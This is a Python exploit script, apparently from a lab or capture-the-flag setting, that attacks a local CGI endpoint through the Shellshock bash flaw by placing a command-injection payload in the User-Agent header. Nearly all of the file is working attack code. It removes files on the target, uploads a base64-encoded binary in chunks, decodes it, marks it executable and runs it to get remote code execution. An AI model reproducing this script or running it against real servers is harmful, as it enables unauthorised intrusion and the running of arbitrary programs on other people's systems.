import urllib.request
import urllib.parse
import time

# Configuration
TARGET_URL = "http://localhost:8085/cgi-bin/status.cgi"
BINARY_PATH = "ls_exploit.b64"
REMOTE_B64_PATH = "/tmp/ls_exploit.b64"
REMOTE_BIN_PATH = "/tmp/ls_exploit"
CHUNK_SIZE = 4000  # Safe size for headers

def run_exploit(command):
    # Shellshock payload
    payload = f"() {{ :; }}; /bin/bash -c '{command}'"
    headers = {
        "User-Agent": payload
    }
    try:
        req = urllib.request.Request(TARGET_URL, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        return e.read().decode('utf-8')
    except Exception as e:
        return str(e)

def main():
    print(f"[*] Reading {BINARY_PATH}...")
    try:
        with open(BINARY_PATH, "r") as f:
            b64_content = f.read().strip()
    except FileNotFoundError:
        print(f"Error: {BINARY_PATH} not found.")
        return

    print(f"[*] Total size: {len(b64_content)} bytes")
    
    # 1. Clean up previous files
    print("[*] Cleaning up remote files...")
    run_exploit(f"rm -f {REMOTE_B64_PATH} {REMOTE_BIN_PATH}")

    # 2. Upload chunks
    print("[*] Uploading chunks...")
    for i in range(0, len(b64_content), CHUNK_SIZE):
        chunk = b64_content[i:i+CHUNK_SIZE]
        print(f"    Sending chunk {i//CHUNK_SIZE + 1}...")
        # We use echo -n to avoid newlines
        cmd = f"/bin/echo -n \"{chunk}\" >> {REMOTE_B64_PATH}"
        run_exploit(cmd)

    # 3. Decode
    print("[*] Decoding base64...")
    run_exploit(f"/usr/bin/base64 -d {REMOTE_B64_PATH} > {REMOTE_BIN_PATH}")

    # 4. Make executable
    print("[*] Making executable...")
    run_exploit(f"chmod +x {REMOTE_BIN_PATH}")

    # 5. Execute
    print("[*] Executing binary...")
    # We need to output headers first to avoid 500 Internal Server Error
    # Redirect stderr to stdout and force exit 0 to ensure we see output
    # Use double quotes for echo to avoid conflict with bash -c '...' single quotes
    output = run_exploit(f"echo \"Content-type: text/plain\"; echo; {REMOTE_BIN_PATH} 2>&1; exit 0")
    
    print("\n[+] Execution Result:")
    print(output)

if __name__ == "__main__":
    main()
